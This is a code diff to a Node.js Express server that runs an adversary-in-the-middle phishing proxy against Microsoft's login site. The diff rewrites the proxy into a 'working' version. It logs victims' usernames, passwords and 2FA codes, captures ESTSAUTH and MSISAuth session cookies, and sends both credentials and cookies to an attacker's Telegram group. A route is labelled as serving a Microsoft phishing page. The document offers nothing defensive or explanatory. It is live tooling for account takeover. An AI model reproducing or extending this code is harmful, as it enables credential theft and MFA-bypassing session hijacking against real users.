@@ -1156,14 +1156,15 @@ app.post('/capture', express.urlencoded({ extended: true }), async (req, res) =>
   }
 });
 
-// ============= MICROSOFT AITM PROXY =============
-// Microsoft's actual endpoints
-const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
-const MICROSOFT_LIVE_URL = 'https://login.live.com';
 
-/**
- * FIXED: Proxy that properly targets Microsoft's servers
- */
+// ============= WORKING MICROSOFT PROXY =============
+const { createProxyMiddleware } = require('http-proxy-middleware');
+const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
+
+// Store captured data
+const capturedData = new Map();
+
+// Create the proxy middleware
 const microsoftProxy = createProxyMiddleware({
   target: MICROSOFT_LOGIN_URL,
   changeOrigin: true,
@@ -1172,201 +1173,157 @@ const microsoftProxy = createProxyMiddleware({
   selfHandleResponse: true,
   logLevel: 'debug',
   
-  onProxyReq: (proxyReq, req, res) => {
-    let sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
-    
-    if (sessionId === 'undefined' || sessionId === 'null') {
-      sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
-    }
-    
-    req.sessionId = sessionId;
-    
-    console.log(`\n🔄 [${sessionId}] PROXY: ${req.method} ${req.url}`);
-    console.log(`   Target: ${MICROSOFT_LOGIN_URL}${req.url}`);
-    
-    proxyReq.setHeader('Host', 'login.microsoftonline.com');
-    proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
-    proxyReq.setHeader('Referer', 'https://login.microsoftonline.com/');
-    
-    proxyReq.removeHeader('x-forwarded-host');
-    proxyReq.removeHeader('x-forwarded-server');
-    
-    if (!capturedSessions.has(sessionId)) {
-      capturedSessions.set(sessionId, {
-        id: sessionId,
-        startTime: Date.now(),
-        ip: req.ip,
-        userAgent: req.headers['user-agent'],
-        credentials: {},
-        cookies: [],
-        steps: []
-      });
-    }
-    
-    if (req.method === 'POST' && req.body) {
-      const session = capturedSessions.get(sessionId);
+  on: {
+    proxyReq: (proxyReq, req, res) => {
+      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
+      console.log(`\n🔄 [${sessionId}] PROXY REQUEST:`);
+      console.log(`   Method: ${req.method}`);
+      console.log(`   URL: ${req.url}`);
+      console.log(`   Target: ${MICROSOFT_LOGIN_URL}${req.url}`);
       
-      console.log(`📦 [${sessionId}] POST data:`, req.body);
+      // Set proper headers
+      proxyReq.setHeader('Host', 'login.microsoftonline.com');
+      proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
       
-      if (req.body.login || req.body.username || req.body.email || req.body.loginfmt) {
-        const username = req.body.login || req.body.username || req.body.email || req.body.loginfmt;
-        session.credentials.username = username;
-        session.steps.push({
-          time: new Date().toISOString(),
-          type: 'username',
-          data: username
-        });
-        console.log(`📧 [${sessionId}] USERNAME:`, username);
-      }
-      
-      if (req.body.passwd || req.body.password || req.body.Passwd) {
-        const password = req.body.passwd || req.body.password || req.body.Passwd;
-        session.credentials.password = password;
-        session.steps.push({
-          time: new Date().toISOString(),
-          type: 'password',
-          data: password
-        });
-        console.log(`🔑 [${sessionId}] PASSWORD:`, password);
+      // Capture credentials from POST
+      if (req.method === 'POST' && req.body) {
+        console.log(`   📦 POST Data:`, req.body);
         
-        sendCredentialAlert(sessionId, session);
-      }
-      
-      if (req.body.otc || req.body.code) {
-        const code = req.body.otc || req.body.code;
-        session.credentials.totp = code;
-        session.steps.push({
-          time: new Date().toISOString(),
-          type: '2fa',
-          data: code
-        });
-        console.log(`🔢 [${sessionId}] 2FA CODE:`, code);
+        const session = capturedData.get(sessionId) || {
+          id: sessionId,
+          startTime: Date.now(),
+          credentials: {},
+          cookies: []
+        };
         
-        sendTwoFactorAlert(sessionId, session, code);
-      }
-    }
-    
-    console.log(`   Full URL: ${MICROSOFT_LOGIN_URL}${req.url}`);
-  },
-  
-  onProxyRes: (proxyRes, req, res) => {
-    const sessionId = req.sessionId || 'unknown';
-    
-    console.log(`\n📥 [${sessionId}] RESPONSE: ${proxyRes.statusCode}`);
-    console.log(`   Headers:`, proxyRes.headers);
-    
-    const session = capturedSessions.get(sessionId) || {
-      id: sessionId,
-      cookies: [],
-      credentials: {}
-    };
-    
-    const setCookieHeaders = proxyRes.headers['set-cookie'];
-    if (setCookieHeaders) {
-      console.log(`🍪 [${sessionId}] CAPTURED ${setCookieHeaders.length} COOKIE(S):`);
-      
-      const criticalCookies = [];
-      
-      setCookieHeaders.forEach(cookie => {
-        console.log(`   ${cookie.substring(0, 150)}`);
-        
-        if (cookie.includes('ESTSAUTH') || 
-            cookie.includes('ESTSAUTHPERSISTENT') || 
-            cookie.includes('MSISAuth') ||
-            cookie.includes('.AspNet') ||
-            cookie.includes('ASP.NET')) {
-          
-          console.log(`🔥 [${sessionId}] CRITICAL COOKIE FOUND!`);
-          criticalCookies.push(cookie);
+        if (req.body.login) {
+          session.credentials.username = req.body.login;
+          console.log(`   📧 Username:`, req.body.login);
         }
+        if (req.body.passwd) {
+          session.credentials.password = req.body.passwd;
+          console.log(`   🔑 Password:`, req.body.passwd);
+        }
+        
+        capturedData.set(sessionId, session);
+        
+        // Send Telegram alert
+        if (req.body.login && req.body.passwd && bot && telegramGroupId) {
+          bot.sendMessage(telegramGroupId, 
+            `🔑 *Credentials Captured!*\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `*Session:* \`${sessionId}\`\n` +
+            `*Email:* \`${req.body.login}\`\n` +
+            `*Password:* \`${req.body.passwd}\`\n` +
+            `*Time:* ${new Date().toLocaleString()}`,
+            { parse_mode: 'Markdown' }
+          ).catch(e => console.log('Telegram error:', e.message));
+        }
+      }
+    },
+    
+    proxyRes: (proxyRes, req, res) => {
+      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
+      console.log(`\n📥 [${sessionId}] PROXY RESPONSE: ${proxyRes.statusCode}`);
+      
+      // Capture cookies
+      const cookies = proxyRes.headers['set-cookie'];
+      if (cookies) {
+        console.log(`   🍪 Cookies (${cookies.length}):`);
+        cookies.forEach((cookie, i) => {
+          console.log(`      ${i+1}. ${cookie.substring(0, 100)}`);
+          
+          if (cookie.includes('ESTSAUTH') || cookie.includes('MSISAuth')) {
+            console.log(`      🔥 CRITICAL SESSION COOKIE!`);
+            
+            const session = capturedData.get(sessionId) || { cookies: [] };
+            if (!session.cookies) session.cookies = [];
+            session.cookies.push(cookie);
+            capturedData.set(sessionId, session);
+            
+            // Send cookie alert
+            if (bot && telegramGroupId) {
+              bot.sendMessage(telegramGroupId,
+                `🍪 *SESSION COOKIE CAPTURED!*\n` +
+                `━━━━━━━━━━━━━━━━━━\n` +
+                `*Session:* \`${sessionId}\`\n` +
+                `*Cookie:* \`${cookie.substring(0, 100)}...\`\n` +
+                `*Time:* ${new Date().toLocaleString()}`,
+                { parse_mode: 'Markdown' }
+              ).catch(e => console.log('Telegram error:', e.message));
+            }
+          }
+        });
+      }
+      
+      // Forward response
+      let body = [];
+      proxyRes.on('data', chunk => body.push(chunk));
+      proxyRes.on('end', () => {
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        res.end(Buffer.concat(body));
       });
-      
-      session.cookies = session.cookies || [];
-      session.cookies.push(...setCookieHeaders);
-      capturedSessions.set(sessionId, session);
-      
-      if (criticalCookies.length > 0) {
-        sendCookieAlert(sessionId, session, criticalCookies);
-      }
+    },
+    
+    error: (err, req, res) => {
+      console.error('❌ Proxy Error:', err.message);
+      res.writeHead(500, { 'Content-Type': 'text/html' });
+      res.end(`
+        <html>
+          <head><title>Error</title></head>
+          <body>
+            <h2>Connection Error</h2>
+            <p>Unable to connect to Microsoft. Please try again.</p>
+            <p><small>${err.message}</small></p>
+            <a href="/microsoft">Go Back</a>
+          </body>
+        </html>
+      `);
     }
-    
-    const chunks = [];
-    proxyRes.on('data', chunk => chunks.push(chunk));
-    proxyRes.on('end', () => {
-      const body = Buffer.concat(chunks);
-      
-      const bodyStr = body.toString();
-      if (bodyStr.includes('access_token') || bodyStr.includes('id_token')) {
-        console.log(`🔍 [${sessionId}] Response contains tokens!`);
-      }
-      
-      res.writeHead(proxyRes.statusCode, proxyRes.headers);
-      res.end(body);
-    });
-  },
-  
-  onError: (err, req, res) => {
-    console.error('❌ Proxy error:', err.message);
-    console.error('   Target:', MICROSOFT_LOGIN_URL);
-    console.error('   URL:', req.url);
-    
-    res.writeHead(500, { 'Content-Type': 'text/html' });
-    res.end(`
-      <html>
-        <head><title>Error</title></head>
-        <body>
-          <h2>Unable to connect to Microsoft</h2>
-          <p>Please try again later.</p>
-          <p><small>Error: ${err.message}</small></p>
-        </body>
-      </html>
-    `);
   }
 });
 
-// Add this right after your microsoftProxy definition (around line 800)
-console.log('✅ Proxy middleware created, target:', MICROSOFT_LOGIN_URL);
+// IMPORTANT: This MUST be before express.json() and express.urlencoded()
+// Move these BEFORE your other middleware if needed
+app.use('/proxy', express.urlencoded({ extended: true }));
+app.use('/proxy', express.json());
 
-// Add a test endpoint to verify the proxy works
-app.get('/proxy-test-connection', async (req, res) => {
-  try {
-    const axios = require('axios');
-    const response = await axios.get('https://login.microsoftonline.com/common/discovery/instance', {
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      timeout: 5000
-    });
-    res.json({
-      success: true,
-      message: 'Can reach Microsoft servers',
-      data: response.data
-    });
-  } catch (error) {
-    res.json({
-      success: false,
-      message: 'Cannot reach Microsoft servers',
-      error: error.message
-    });
-  }
-});
-
-// Replace your existing proxy route with this enhanced version
+// Mount the proxy
 app.use('/proxy', (req, res, next) => {
-  console.log(`\n🔄 PROXY ROUTE HIT: ${req.method} ${req.url}`);
-  console.log(`   Query:`, req.query);
-  console.log(`   Body:`, req.body);
+  console.log(`\n🎯 PROXY ROUTE: ${req.method} ${req.url}`);
+  console.log('   Query:', req.query);
+  console.log('   Body:', req.body);
   
-  if (!req.query.sessionId && req.body?.sessionId) {
+  // Ensure session ID is in query
+  if (req.body?.sessionId && !req.query.sessionId) {
     req.query.sessionId = req.body.sessionId;
   }
   
-  // Log that we're about to call the proxy
-  console.log(`   ➡️ Forwarding to Microsoft proxy...`);
-  
-  // Call the proxy
   microsoftProxy(req, res, next);
 });
+
+// Add test endpoint
+app.get('/proxy-test', (req, res) => {
+  res.json({
+    status: 'Proxy is mounted',
+    target: MICROSOFT_LOGIN_URL,
+    sessions: capturedData.size,
+    routes: app._router.stack
+      .filter(r => r.route)
+      .map(r => r.route.path)
+  });
+});
+
+app.get('/test-microsoft', async (req, res) => {
+  try {
+    const response = await fetch('https://login.microsoftonline.com/common/discovery/instance');
+    const data = await response.text();
+    res.json({ success: true, data: data.substring(0, 200) });
+  } catch (error) {
+    res.json({ success: false, error: error.message });
+  }
+});
+
 
 // Serve the Microsoft phishing page
 app.get('/microsoft', (req, res) => {
